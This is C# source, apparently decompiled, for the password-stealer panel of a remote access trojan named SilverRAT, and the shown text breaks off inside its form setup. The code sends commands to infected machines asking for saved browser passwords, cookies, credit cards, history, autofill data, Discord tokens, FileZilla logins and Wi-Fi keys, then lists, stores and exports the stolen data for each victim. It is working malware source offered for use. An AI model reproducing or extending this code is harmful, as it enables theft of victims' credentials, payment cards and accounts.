using Bunifu.Framework.UI;
using Bunifu.UI.WinForms;
using Guna.UI2.WinForms;
using SilverRAT.Connection;
using SilverRAT.Handle_Packet;
using SilverRAT.MessagePack;
using System;
using System.Collections;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Threading;
using System.Windows.Forms;

namespace SilverRAT.Forms;

public class Passwords : Form
{
    public object syncPicbox = new object();

    private IContainer components = null;

    private BunifuElipse FormElipse;

    private ContextMenuStrip ContexPasswords;

    private ToolStripMenuItem RefrshListPassword;

    private BunifuDragControl FormDragControl1;

    public System.Windows.Forms.Timer Timer1;

    public System.Windows.Forms.Timer TimerCounFile;

    private Panel panelForm;

    private BunifuPages PagePAS;

    private TabPage PagePasswords;

    private TabPage PageCookies;

    private TabPage PageCreditCards;

    private Panel PaneControll;

    private Guna2Button ButCookies;

    private Guna2Button ButPass;

    private Guna2Button ButVisa;

    private BunifuPanel PanelTitle;

    private Guna2CircleButton ButtClose;

    private Guna2CircleButton ButtionMinimized;

    private BunifuLabel TitlrPage;

    public BunifuLoader LoaderConnect;

    private BunifuLabel UserIdInfo;

    private BunifuLabel bunifuLabel1;

    private PictureBox ImageLogo;

    private BunifuPanel PanelBottom;

    private BunifuPanel PanelLeft;

    private BunifuPanel PanelTOP;

    private BunifuPanel PanelRight;

    private TabPage PageHistory;

    private TabPage PageAutoFill;

    private TabPage PageBookmarks;

    private TabPage PageDiscord;

    private TabPage PageFileZilla;

    private TabPage PageWiFi;

    private Guna2Button ButWifi;

    private Guna2Button ButDiscord;

    private Guna2Button ButMarket;

    private Guna2Button ButFileZaill;

    private Guna2Button ButHistory;

    private Guna2Button ButFiles;

    public Guna2DataGridView ListPasswords;

    public Guna2DataGridView ListCookies;

    public Guna2DataGridView ListCreditCards;

    public Guna2DataGridView ListHostiry;

    private DataGridViewImageColumn dataGridViewImageColumn4;

    private DataGridViewTextBoxColumn dataGridViewTextBoxColumn11;

    private DataGridViewTextBoxColumn dataGridViewTextBoxColumn12;

    private DataGridViewTextBoxColumn Column8;

    private DataGridViewTextBoxColumn Column9;

    public Guna2DataGridView ListMarket;

    private DataGridViewImageColumn dataGridViewImageColumn6;

    private DataGridViewTextBoxColumn dataGridViewTextBoxColumn16;

    private DataGridViewTextBoxColumn dataGridViewTextBoxColumn17;

    private DataGridViewTextBoxColumn dataGridViewTextBoxColumn18;

    public Guna2DataGridView ListDiscord;

    private DataGridViewImageColumn dataGridViewImageColumn7;

    private DataGridViewTextBoxColumn dataGridViewTextBoxColumn19;

    public ImageList imageList1;

    public Guna2DataGridView ListAutoFiles;

    private DataGridViewImageColumn dataGridViewImageColumn5;

    private DataGridViewTextBoxColumn dataGridViewTextBoxColumn13;

    private DataGridViewTextBoxColumn dataGridViewTextBoxColumn14;

    private DataGridViewTextBoxColumn dataGridViewTextBoxColumn15;

    private ContextMenuStrip ContexDiscord;

    private ToolStripMenuItem RefreshListDiscord;

    private ContextMenuStrip ContexListFileZilla;

    private ToolStripMenuItem RefreshListFileZilla;

    public Guna2DataGridView ListFilezilla;

    private DataGridViewImageColumn dataGridViewImageColumn8;

    private DataGridViewTextBoxColumn dataGridViewTextBoxColumn20;

    private DataGridViewTextBoxColumn dataGridViewTextBoxColumn21;

    private DataGridViewTextBoxColumn dataGridViewTextBoxColumn22;

    private DataGridViewTextBoxColumn dataGridViewTextBoxColumn23;

    public Guna2DataGridView ListWifi;

    private ContextMenuStrip ContexListWifi;

    private ToolStripMenuItem RefreshListWifi;

    private DataGridViewImageColumn dataGridViewImageColumn1;

    private DataGridViewTextBoxColumn Column6;

    private DataGridViewTextBoxColumn dataGridViewTextBoxColumn1;

    private DataGridViewTextBoxColumn Column4;

    private DataGridViewTextBoxColumn Column5;

    private DataGridViewImageColumn dataGridViewImageColumn2;

    private DataGridViewTextBoxColumn dataGridViewTextBoxColumn2;

    private DataGridViewTextBoxColumn dataGridViewTextBoxColumn3;

    private DataGridViewTextBoxColumn dataGridViewTextBoxColumn4;

    private DataGridViewTextBoxColumn dataGridViewTextBoxColumn5;

    private DataGridViewTextBoxColumn Column1;

    private DataGridViewTextBoxColumn Column2;

    private DataGridViewTextBoxColumn Column3;

    private DataGridViewTextBoxColumn Column7;

    private DataGridViewImageColumn dataGridViewImageColumn3;

    private DataGridViewTextBoxColumn dataGridViewTextBoxColumn6;

    private DataGridViewTextBoxColumn dataGridViewTextBoxColumn7;

    private DataGridViewTextBoxColumn dataGridViewTextBoxColumn8;

    private DataGridViewTextBoxColumn dataGridViewTextBoxColumn9;

    private DataGridViewTextBoxColumn dataGridViewTextBoxColumn10;

    private DataGridViewImageColumn dataGridViewImageColumn9;

    private DataGridViewTextBoxColumn dataGridViewTextBoxColumn24;

    private DataGridViewTextBoxColumn dataGridViewTextBoxColumn25;

    private DataGridViewTextBoxColumn dataGridViewTextBoxColumn26;

    private ToolStripMenuItem Editor;

    private ToolStripMenuItem SavePass;

    private ToolStripMenuItem SaveListDiscord;

    private ToolStripMenuItem SaveFileZilla;

    private ToolStripMenuItem SaveWifi;

    public Bitmap Logo { get; set; }

    public FormSilver F { get; set; }

    internal Clients ParentClient { get; set; }

    internal Clients Client { get; set; }

    public string PathSave { get; set; }

    public Passwords()
    {
        InitializeComponent();
        MaximumSize = base.Size;
        MinimumSize = base.Size;
    }

    private void ButPass_Click(object sender, EventArgs e)
    {
        PagePAS.SelectedIndex = 0;
        TitlrPage.Text = "Browser";
    }

    private void ButCookies_Click(object sender, EventArgs e)
    {
        PagePAS.SelectedIndex = 1;
        TitlrPage.Text = "Cookies";
    }

    private void ButVisa_Click(object sender, EventArgs e)
    {
        PagePAS.SelectedIndex = 2;
        TitlrPage.Text = "CreditCards";
    }

    private void ButHistory_Click(object sender, EventArgs e)
    {
        PagePAS.SelectedIndex = 3;
        TitlrPage.Text = "History";
    }

    private void ButFiles_Click(object sender, EventArgs e)
    {
        PagePAS.SelectedIndex = 4;
        TitlrPage.Text = "Files";
    }

    private void ButMarket_Click(object sender, EventArgs e)
    {
        PagePAS.SelectedIndex = 5;
        TitlrPage.Text = "Market";
    }

    private void ButDiscord_Click(object sender, EventArgs e)
    {
        PagePAS.SelectedIndex = 6;
        TitlrPage.Text = "Discord";
    }

    private void ButFileZaill_Click(object sender, EventArgs e)
    {
        PagePAS.SelectedIndex = 7;
        TitlrPage.Text = "FileZaill";
    }

    private void ButWifi_Click(object sender, EventArgs e)
    {
        PagePAS.SelectedIndex = 8;
        TitlrPage.Text = "WiFi";
    }

    private void Passwords_Load(object sender, EventArgs e)
    {
        try
        {
            string userIDClient = Packet.GetUserIDClient(ParentClient.DGV);
            UserIdInfo.Text = userIDClient;
            string[] array = userIDClient.Split('\\');
            PathSave = Path.Combine(Application.StartupPath, "Clients", "Passwords\\" + array[0] + "_" + array[1]);
            if (!Directory.Exists(PathSave))
            {
                Directory.CreateDirectory(PathSave);
            }
        }
        catch
        {
            UserIdInfo.Text = "Not Found!";
        }
        try
        {
            FormElipse.ElipseRadius = Settings.CurvatureForm;
            if (Settings.EnableEdgecurvatureForm)
            {
                PanelLeft.BackgroundColor = Settings.ColorCurvatureForm;
                PanelTOP.BackgroundColor = Settings.ColorCurvatureForm;
                PanelBottom.BackgroundColor = Settings.ColorCurvatureForm;
                PanelRight.BackgroundColor = Settings.ColorCurvatureForm;
            }
            else
            {
                PanelLeft.Visible = false;
                PanelTOP.Visible = false;
                PanelBottom.Visible = false;
                PanelRight.Visible = false;
            }
            if (Logo != null)
            {
                ImageLogo.Image = Logo;
            }
        }
        catch
        {
        }
    }

    private void Passwords_Shown(object sender, EventArgs e)
    {
        Program.Silver.TransitionShowng.ShowSync(panelForm);
    }

    private void ButtClose_Click(object sender, EventArgs e)
    {
        Close();
    }

    private void ButtionMinimized_Click(object sender, EventArgs e)
    {
        if (base.WindowState != FormWindowState.Minimized)
        {
            base.WindowState = FormWindowState.Minimized;
        }
    }

    private void Timer1_Tick(object sender, EventArgs e)
    {
        if (!ParentClient.TcpClient.Connected || !Client.TcpClient.Connected)
        {
            ThreadPool.QueueUserWorkItem(delegate
            {
                Client?.Disconnected();
            });
            Close();
        }
    }

    private void Passwords_FormClosing(object sender, FormClosingEventArgs e)
    {
        try
        {
            Program.Silver.TransitionHiddeng.HideSync(panelForm);
            ThreadPool.QueueUserWorkItem(delegate
            {
                Client?.Disconnected();
            });
        }
        catch
        {
        }
    }

    private string GetKeyTap()
    {
        if (PagePAS.SelectedIndex == 0)
        {
            ListPasswords.Rows.Clear();
            return "Password";
        }
        if (PagePAS.SelectedIndex == 1)
        {
            ListCookies.Rows.Clear();
            return "Cooks";
        }
        if (PagePAS.SelectedIndex == 2)
        {
            ListCreditCards.Rows.Clear();
            return "Credit";
        }
        if (PagePAS.SelectedIndex == 3)
        {
            ListHostiry.Rows.Clear();
            return "Logs";
        }
        if (PagePAS.SelectedIndex == 4)
        {
            ListAutoFiles.Rows.Clear();
            return "Files";
        }
        if (PagePAS.SelectedIndex == 5)
        {
            ListMarket.Rows.Clear();
            return "Market";
        }
        ListPasswords.Rows.Clear();
        return "Password";
    }

    private void RefrshListPassword_Click(object sender, EventArgs e)
    {
        try
        {
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Packet").AsString = GetKeyTap();
            ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
        }
        catch
        {
        }
    }

    private void RefreshListDiscord_Click(object sender, EventArgs e)
    {
        try
        {
            if (ListDiscord.Rows.Count > 0)
            {
                ListDiscord.Rows.Clear();
            }
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Packet").AsString = "TokenDiscord";
            ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
        }
        catch
        {
        }
    }

    private void RefreshListFileZilla_Click(object sender, EventArgs e)
    {
        try
        {
            if (ListFilezilla.Rows.Count > 0)
            {
                ListFilezilla.Rows.Clear();
            }
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Packet").AsString = "FileZilla";
            ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
        }
        catch
        {
        }
    }

    private void RefreshListWifi_Click(object sender, EventArgs e)
    {
        try
        {
            if (ListWifi.Rows.Count > 0)
            {
                ListWifi.Rows.Clear();
            }
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Packet").AsString = "WiFi";
            ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
        }
        catch
        {
        }
    }

    private void Editor_Click(object sender, EventArgs e)
    {
        try
        {
            string pathSave = GetPathSave();
            if (File.Exists(pathSave))
            {
                Process.Start(pathSave);
            }
            else
            {
                MessageBox.Show(this, "This document was not found!", "Passwords!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
            }
        }
        catch
        {
        }
    }

    private string GetPathSave()
    {
        if (PagePAS.SelectedIndex == 0)
        {
            return PathSave + "\\Passwords.txt";
        }
        if (PagePAS.SelectedIndex == 1)
        {
            return PathSave + "\\Cookies.txt";
        }
        if (PagePAS.SelectedIndex == 2)
        {
            return PathSave + "\\CreditCards.txt";
        }
        if (PagePAS.SelectedIndex == 3)
        {
            return PathSave + "\\History.txt";
        }
        if (PagePAS.SelectedIndex == 4)
        {
            return PathSave + "\\AutoFiles.txt";
        }
        if (PagePAS.SelectedIndex == 5)
        {
            return PathSave + "\\Market.txt";
        }
        return PathSave + "\\Passwords.txt";
    }

    private void SavePassords()
    {
        if (PagePAS.SelectedIndex == 0)
        {
            if (ListPasswords.RowCount == 0)
            {
                return;
            }
            SaveFileDialog saveFileDialog = new SaveFileDialog
            {
                Filter = "TXT |*.txt",
                FileName = "Password"
            };
            if (saveFileDialog.ShowDialog() == DialogResult.OK)
            {
                using TextWriter textWriter = new StreamWriter(saveFileDialog.FileName);
                foreach (DataGridViewRow item in (IEnumerable)ListPasswords.Rows)
                {
                    if (!item.IsNewRow)
                    {
                        textWriter.Write("=======================================================");
                        textWriter.WriteLine();
                        textWriter.Write("App : " + item.Cells[1].Value.ToString());
                        textWriter.WriteLine();
                        textWriter.Write("Username : " + item.Cells[2].Value.ToString());
                        textWriter.WriteLine();
                        textWriter.Write("Password : " + item.Cells[3].Value.ToString());
                        textWriter.WriteLine();
                        textWriter.Write("Url : " + item.Cells[4].Value.ToString());
                        textWriter.WriteLine();
                    }
                }
                textWriter.Close();
            }
        }
        if (PagePAS.SelectedIndex == 1)
        {
            if (ListCookies.RowCount == 0)
            {
                return;
            }
            SaveFileDialog saveFileDialog2 = new SaveFileDialog
            {
                Filter = "TXT |*.txt",
                FileName = "Cookies"
            };
            if (saveFileDialog2.ShowDialog() == DialogResult.OK)
            {
                using TextWriter textWriter2 = new StreamWriter(saveFileDialog2.FileName);
                foreach (DataGridViewRow item2 in (IEnumerable)ListCookies.Rows)
                {
                    if (!item2.IsNewRow)
                    {
                        textWriter2.Write("=======================================================");
                        textWriter2.WriteLine();
                        textWriter2.Write("name : " + item2.Cells[1].Value.ToString());
                        textWriter2.WriteLine();
                        textWriter2.Write("Username : " + item2.Cells[2].Value.ToString());
                        textWriter2.WriteLine();
                        textWriter2.Write("Key : " + item2.Cells[3].Value.ToString());
                        textWriter2.WriteLine();
                        textWriter2.Write("Secure : " + item2.Cells[4].Value.ToString());
                        textWriter2.WriteLine();
                        textWriter2.Write("Host key : " + item2.Cells[5].Value.ToString());
                        textWriter2.WriteLine();
                        textWriter2.Write("Expires : " + item2.Cells[6].Value.ToString());
                        textWriter2.WriteLine();
                        textWriter2.Write("Value : " + item2.Cells[7].Value.ToString());
                        textWriter2.WriteLine();
                        textWriter2.Write("Path : " + item2.Cells[8].Value.ToString());
                        textWriter2.WriteLine();
                    }
                }
                textWriter2.Close();
            }
        }
        if (PagePAS.SelectedIndex == 2)
        {
            if (ListCreditCards.RowCount == 0)
            {
                return;
            }
            SaveFileDialog saveFileDialog3 = new SaveFileDialog
            {
                Filter = "TXT |*.txt",
                FileName = "CreditCards"
            };
            if (saveFileDialog3.ShowDialog() == DialogResult.OK)
            {
                using TextWriter textWriter3 = new StreamWriter(saveFileDialog3.FileName);
                foreach (DataGridViewRow item3 in (IEnumerable)ListCreditCards.Rows)
                {
                    if (!item3.IsNewRow)
                    {
                        textWriter3.Write("=======================================================");
                        textWriter3.WriteLine();
                        textWriter3.Write("name : " + item3.Cells[1].Value.ToString());
                        textWriter3.WriteLine();
                        textWriter3.Write("Type : " + item3.Cells[2].Value.ToString());
                        textWriter3.WriteLine();
                        textWriter3.Write("Number : " + item3.Cells[3].Value.ToString());
                        textWriter3.WriteLine();
                        textWriter3.Write("ExpMonth : " + item3.Cells[4].Value.ToString());
                        textWriter3.WriteLine();
                        textWriter3.Write("Username : " + item3.Cells[5].Value.ToString());
                        textWriter3.WriteLine();
                    }
                }
                textWriter3.Close();
            }
        }
        if (PagePAS.SelectedIndex == 3)
        {
            if (ListHostiry.Rows.Count == 0)
            {
                return;
            }
            SaveFileDialog saveFileDialog4 = new SaveFileDialog
            {
                Filter = "TXT |*.txt",
                FileName = "History"
            };
            if (saveFileDialog4.ShowDialog() == DialogResult.OK)
            {
                using TextWriter textWriter4 = new StreamWriter(saveFileDialog4.FileName);
                foreach (DataGridViewRow item4 in (IEnumerable)ListHostiry.Rows)
                {
                    if (!item4.IsNewRow)
                    {
                        textWriter4.Write("=======================================================");
                        textWriter4.WriteLine();
                        textWriter4.Write("name : " + item4.Cells[1].Value.ToString());
                        textWriter4.WriteLine();
                        textWriter4.Write("Title : " + item4.Cells[2].Value.ToString());
                        textWriter4.WriteLine();
                        textWriter4.Write("URL : " + item4.Cells[3].Value.ToString());
                        textWriter4.WriteLine();
                        textWriter4.Write("Count : " + item4.Cells[4].Value.ToString());
                        textWriter4.WriteLine();
                    }
                }
                textWriter4.Close();
            }
        }
        if (PagePAS.SelectedIndex == 4)
        {
            if (ListAutoFiles.RowCount == 0)
            {
                return;
            }
            SaveFileDialog saveFileDialog5 = new SaveFileDialog
            {
                Filter = "TXT |*.txt",
                FileName = "AutoFiles"
            };
            if (saveFileDialog5.ShowDialog() == DialogResult.OK)
            {
                using TextWriter textWriter5 = new StreamWriter(saveFileDialog5.FileName);
                foreach (DataGridViewRow item5 in (IEnumerable)ListAutoFiles.Rows)
                {
                    if (!item5.IsNewRow)
                    {
                        textWriter5.Write("=======================================================");
                        textWriter5.WriteLine();
                        textWriter5.Write("App : " + item5.Cells[1].Value.ToString());
                        textWriter5.WriteLine();
                        textWriter5.Write("Name : " + item5.Cells[2].Value.ToString());
                        textWriter5.WriteLine();
                        textWriter5.Write("Value : " + item5.Cells[3].Value.ToString());
                        textWriter5.WriteLine();
                    }
                }
                textWriter5.Close();
            }
        }
        if (PagePAS.SelectedIndex != 5 || ListMarket.RowCount == 0)
        {
            return;
        }
        SaveFileDialog saveFileDialog6 = new SaveFileDialog
        {
            Filter = "TXT |*.txt",
            FileName = "Market"
        };
        if (saveFileDialog6.ShowDialog() != DialogResult.OK)
        {
            return;
        }
        using TextWriter textWriter6 = new StreamWriter(saveFileDialog6.FileName);
        foreach (DataGridViewRow item6 in (IEnumerable)ListMarket.Rows)
        {
            if (!item6.IsNewRow)
            {
                textWriter6.Write("=======================================================");
                textWriter6.WriteLine();
                textWriter6.Write("App : " + item6.Cells[1].Value.ToString());
                textWriter6.WriteLine();
                textWriter6.Write("Name : " + item6.Cells[2].Value.ToString());
                textWriter6.WriteLine();
                textWriter6.Write("Value : " + item6.Cells[3].Value.ToString());
                textWriter6.WriteLine();
            }
        }
        textWriter6.Close();
    }

    private void SavePass_Click(object sender, EventArgs e)
    {
        SavePassords();
    }

    private void SaveListDiscord_Click(object sender, EventArgs e)
    {
        if (ListDiscord.RowCount == 0)
        {
            return;
        }
        SaveFileDialog saveFileDialog = new SaveFileDialog
        {
            Filter = "TXT |*.txt",
            FileName = "Discord_Token"
        };
        if (saveFileDialog.ShowDialog() != DialogResult.OK)
        {
            return;
        }
        using TextWriter textWriter = new StreamWriter(saveFileDialog.FileName);
        foreach (DataGridViewRow item in (IEnumerable)ListDiscord.Rows)
        {
            if (!item.IsNewRow)
            {
                textWriter.Write("=======================================================");
                textWriter.WriteLine();
                textWriter.Write("Discord Token : " + item.Cells[1].Value.ToString());
                textWriter.WriteLine();
            }
        }
        textWriter.Close();
    }

    private void SaveFileZilla_Click(object sender, EventArgs e)
    {
        if (ListFilezilla.RowCount == 0)
        {
            return;
        }
        SaveFileDialog saveFileDialog = new SaveFileDialog
        {
            Filter = "TXT |*.txt",
            FileName = "FileZilla"
        };
        if (saveFileDialog.ShowDialog() != DialogResult.OK)
        {
            return;
        }
        using TextWriter textWriter = new StreamWriter(saveFileDialog.FileName);
        foreach (DataGridViewRow item in (IEnumerable)ListFilezilla.Rows)
        {
            if (!item.IsNewRow)
            {
                textWriter.Write("=======================================================");
                textWriter.WriteLine();
                textWriter.Write("App : FileZilla");
                textWriter.WriteLine();
                textWriter.Write("Username : " + item.Cells[2].Value.ToString());
                textWriter.WriteLine();
                textWriter.Write("Password : " + item.Cells[3].Value.ToString());
                textWriter.WriteLine();
                textWriter.Write("Url : " + item.Cells[4].Value.ToString());
                textWriter.WriteLine();
            }
        }
        textWriter.Close();
    }

    private void SaveWifi_Click(object sender, EventArgs e)
    {
        if (ListWifi.RowCount == 0)
        {
            return;
        }
        SaveFileDialog saveFileDialog = new SaveFileDialog
        {
            Filter = "TXT |*.txt",
            FileName = "Wifi"
        };
        if (saveFileDialog.ShowDialog() != DialogResult.OK)
        {
            return;
        }
        using TextWriter textWriter = new StreamWriter(saveFileDialog.FileName);
        foreach (DataGridViewRow item in (IEnumerable)ListWifi.Rows)
        {
            if (!item.IsNewRow)
            {
                textWriter.Write("=======================================================");
                textWriter.WriteLine();
                textWriter.Write("Wifi Info");
                textWriter.WriteLine();
                textWriter.Write("Username : " + item.Cells[2].Value.ToString());
                textWriter.WriteLine();
                textWriter.Write("Password : " + item.Cells[3].Value.ToString());
                textWriter.WriteLine();
            }
        }
        textWriter.Close();
    }

    protected override void Dispose(bool disposing)
    {
        if (disposing && components != null)
        {
            components.Dispose();
        }
        base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
        this.components = new System.ComponentModel.Container();
        Utilities.BunifuPages.BunifuAnimatorNS.Animation animation = new Utilities.BunifuPages.BunifuAnimatorNS.Animation();
        System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle = new System.Windows.Forms.DataGridViewCellStyle();
        System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle2 = new System.Windows.Forms.DataGridViewCellStyle();
        System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle3 = new System.Windows.Forms.DataGridViewCellStyle();
        System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle4 = new System.Windows.Forms.DataGridViewCellStyle();
        System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Forms.Passwords));
        System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle5 = new System.Windows.Forms.DataGridViewCellStyle();
        System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle6 = new System.Windows.Forms.DataGridViewCellStyle();
        System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle7 = new System.Windows.Forms.DataGridViewCellStyle();
        System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle8 = new System.Windows.Forms.DataGridViewCellStyle();
        System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle9 = new System.Windows.Forms.DataGridViewCellStyle();
        System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle10 = new System.Windows.Forms.DataGridViewCellStyle();
        System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle11 = new System.Windows.Forms.DataGridViewCellStyle();
        System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle12 = new System.Windows.Forms.DataGridViewCellStyle();
        System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle13 = new System.Windows.Forms.DataGridViewCellStyle();
        System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle14 = new System.Windows.Forms.DataGridViewCellStyle();
        System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle15 = new System.Windows.Forms.DataGridViewCellStyle();
        System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle16 = new System.Windows.Forms.DataGridViewCellStyle();
        System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle17 = new System.Windows.Forms.DataGridViewCellStyle();
        System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle18 = new System.Windows.Forms.DataGridViewCellStyle();
        System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle19 = new System.Windows.Forms.DataGridViewCellStyle();
        System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle20 = new System.Windows.Forms.DataGridViewCellStyle();
        System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle21 = new System.Windows.Forms.DataGridViewCellStyle();
        System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle22 = new System.Windows.Forms.DataGridViewCellStyle();
        System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle23 = new System.Windows.Forms.DataGridViewCellStyle();
        System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle24 = new System.Windows.Forms.DataGridViewCellStyle();
        System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle25 = new System.Windows.Forms.DataGridViewCellStyle();
        System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle26 = new System.Windows.Forms.DataGridViewCellStyle();
        System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle27 = new System.Windows.Forms.DataGridViewCellStyle();
        System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle28 = new System.Windows.Forms.DataGridViewCellStyle();
        System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle29 = new System.Windows.Forms.DataGridViewCellStyle();
        System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle30 = new System.Windows.Forms.DataGridViewCellStyle();
        System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle31 = new System.Windows.Forms.DataGridViewCellStyle();
        System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle32 = new System.Windows.Forms.DataGridViewCellStyle();
        System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle33 = new System.Windows.Forms.DataGridViewCellStyle();
        System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle34 = new System.Windows.Forms.DataGridViewCellStyle();
        System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle35 = new System.Windows.Forms.DataGridViewCellStyle();
        this.FormElipse = new Bunifu.Framework.UI.BunifuElipse(this.components);
        this.panelForm = new System.Windows.Forms.Panel();
        this.PagePAS = new Bunifu.UI.WinForms.BunifuPages();
        this.PagePasswords = new System.Windows.Forms.TabPage();
        this.ListPasswords = new Guna.UI2.WinForms.Guna2DataGridView();
        this.dataGridViewImageColumn1 = new System.Windows.Forms.DataGridViewImageColumn();
        this.Column6 = new System.Windows.Forms.DataGridViewTextBoxColumn();
        this.dataGridViewTextBoxColumn1 = new System.Windows.Forms.DataGridViewTextBoxColumn();
        this.Column4 = new System.Windows.Forms.DataGridViewTextBoxColumn();
        this.Column5 = new System.Windows.Forms.DataGridViewTextBoxColumn();
        this.ContexPasswords = new System.Windows.Forms.ContextMenuStrip(this.components);
        this.RefrshListPassword = new System.Windows.Forms.ToolStripMenuItem();
        this.Editor = new System.Windows.Forms.ToolStripMenuItem();
        this.SavePass = new System.Windows.Forms.ToolStripMenuItem();
        this.PageCookies = new System.Windows.Forms.TabPage();
        this.ListCookies = new Guna.UI2.WinForms.Guna2DataGridView();
        this.dataGridViewImageColumn2 = new System.Windows.Forms.DataGridViewImageColumn();
        this.dataGridViewTextBoxColumn2 = new System.Windows.Forms.DataGridViewTextBoxColumn();
        this.dataGridViewTextBoxColumn3 = new System.Windows.Forms.DataGridViewTextBoxColumn();
        this.dataGridViewTextBoxColumn4 = new System.Windows.Forms.DataGridViewTextBoxColumn();
        this.dataGridViewTextBoxColumn5 = new System.Windows.Forms.DataGridViewTextBoxColumn();
        this.Column1 = new System.Windows.Forms.DataGridViewTextBoxColumn();
        this.Column2 = new System.Windows.Forms.DataGridViewTextBoxColumn();
        this.Column3 = new System.Windows.Forms.DataGridViewTextBoxColumn();
        this.Column7 = new System.Windows.Forms.DataGridViewTextBoxColumn();
        this.PageCreditCards = new System.Windows.Forms.TabPage();
        this.ListCreditCards = new Guna.UI2.WinForms.Guna2DataGridView();
        this.dataGridViewImageColumn3 = new System.Windows.Forms.DataGridViewImageColumn();
        this.dataGridViewTextBoxColumn6 = new System.Windows.Forms.DataGridViewTextBoxColumn();
        this.dataGridViewTextBoxColumn7 = new System.Windows.Forms.DataGridViewTextBoxColumn();
        this.dataGridViewTextBoxColumn8 = new System.Windows.Forms.DataGridViewTextBoxColumn();
        this.dataGridViewTextBoxColumn9 = new System.Windows.Forms.DataGridViewTextBoxColumn();
        this.dataGridViewTextBoxColumn10 = new System.Windows.Forms.DataGridViewTextBoxColumn();
        this.PageHistory = new System.Windows.Forms.TabPage();
        this.ListHostiry = new Guna.UI2.WinForms.Guna2DataGridView();
        this.dataGridViewImageColumn4 = new System.Windows.Forms.DataGridViewImageColumn();
        this.dataGridViewTextBoxColumn11 = new System.Windows.Forms.DataGridViewTextBoxColumn();
        this.dataGridViewTextBoxColumn12 = new System.Windows.Forms.DataGridViewTextBoxColumn();
        this.Column8 = new System.Windows.Forms.DataGridViewTextBoxColumn();
        this.Column9 = new System.Windows.Forms.DataGridViewTextBoxColumn();
        this.PageAutoFill = new System.Windows.Forms.TabPage();
        this.ListAutoFiles = new Guna.UI2.WinForms.Guna2DataGridView();
        this.dataGridViewImageColumn5 = new System.Windows.Forms.DataGridViewImageColumn();
        this.dataGridViewTextBoxColumn13 = new System.Windows.Forms.DataGridViewTextBoxColumn();
        this.dataGridViewTextBoxColumn14 = new System.Windows.Forms.DataGridViewTextBoxColumn();
        this.dataGridViewTextBoxColumn15 = new System.Windows.Forms.DataGridViewTextBoxColumn();
        this.PageBookmarks = new System.Windows.Forms.TabPage();
        this.ListMarket = new Guna.UI2.WinForms.Guna2DataGridView();
        this.dataGridViewImageColumn6 = new System.Windows.Forms.DataGridViewImageColumn();
        this.dataGridViewTextBoxColumn16 = new System.Windows.Forms.DataGridViewTextBoxColumn();
        this.dataGridViewTextBoxColumn17 = new System.Windows.Forms.DataGridViewTextBoxColumn();
        this.dataGridViewTextBoxColumn18 = new System.Windows.Forms.DataGridViewTextBoxColumn();
        this.PageDiscord = new System.Windows.Forms.TabPage();
        this.ListDiscord = new Guna.UI2.WinForms.Guna2DataGridView();
        this.dataGridViewImageColumn7 = new System.Windows.Forms.DataGridViewImageColumn();
        this.dataGridViewTextBoxColumn19 = new System.Windows.Forms.DataGridViewTextBoxColumn();
        this.ContexDiscord = new System.Windows.Forms.ContextMenuStrip(this.components);
        this.RefreshListDiscord = new System.Windows.Forms.ToolStripMenuItem();
        this.SaveListDiscord = new System.Windows.Forms.ToolStripMenuItem();
        this.PageFileZilla = new System.Windows.Forms.TabPage();
        this.ListFilezilla = new Guna.UI2.WinForms.Guna2DataGridView();
        this.dataGridViewImageColumn8 = new System.Windows.Forms.DataGridViewImageColumn();
        this.dataGridViewTextBoxColumn20 = new System.Windows.Forms.DataGridViewTextBoxColumn();
        this.dataGridViewTextBoxColumn21 = new System.Windows.Forms.DataGridViewTextBoxColumn();
        this.dataGridViewTextBoxColumn22 = new System.Windows.Forms.DataGridViewTextBoxColumn();
        this.dataGridViewTextBoxColumn23 = new System.Windows.Forms.DataGridViewTextBoxColumn();
        this.ContexListFileZilla = new System.Windows.Forms.ContextMenuStrip(this.components);
